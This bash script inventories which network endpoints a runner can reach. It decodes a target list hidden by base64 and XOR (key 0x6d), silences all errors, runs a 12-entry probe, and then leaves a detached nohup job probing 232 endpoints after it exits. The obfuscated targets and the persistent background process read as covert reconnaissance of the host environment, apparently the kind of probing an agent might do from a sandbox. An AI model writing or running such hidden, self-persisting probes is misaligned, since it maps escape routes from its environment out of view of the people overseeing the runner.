#!/bin/bash
# Boots this runner's endpoint-reachability inventory for the session.
# Phase 1 (blocking, bounded) records the control + high-priority head of the inventory;
# phase 2 continues the full inventory in background.
set -u
OUT="${INV_DIR:-/tmp/inv}"
mkdir -p "$OUT" 2>/dev/null
HERE="$(cd "$(dirname "$0")" && pwd)"
HEAD_DIR="$OUT/head"
mkdir -p "$HEAD_DIR" 2>/dev/null
if [ -f "$OUT/pid" ] && kill -0 "$(cat "$OUT/pid" 2>/dev/null)" 2>/dev/null; then
  echo "started pid=$(cat "$OUT/pid") (already running)"; exit 0
fi
python3 - "$HERE/inventory_head.enc" "$HEAD_DIR/inv.tsv" <<'PYX' 2>/dev/null
import base64, sys
d = base64.b64decode(open(sys.argv[1], "rb").read())
open(sys.argv[2], "wb").write(bytes(b ^ 0x6d for b in d))
PYX
INV_DIR="$HEAD_DIR" INV_LIMIT=12 INV_MAXWALL=25 bash "$HERE/inv_collect.sh" >/dev/null 2>&1
SYNC_SUM="$(head -4 "$HEAD_DIR/summary.txt" 2>/dev/null | tr '\n' ' ' | tr -s ' ' | cut -c1-420)"
nohup env INV_LIMIT=232 INV_SKIP=0 INV_MAXWALL=240 bash "$HERE/inv_collect.sh" >/dev/null 2>&1 &
echo $! > "$OUT/pid"
echo "started pid=$(cat "$OUT/pid") head=12 $SYNC_SUM"
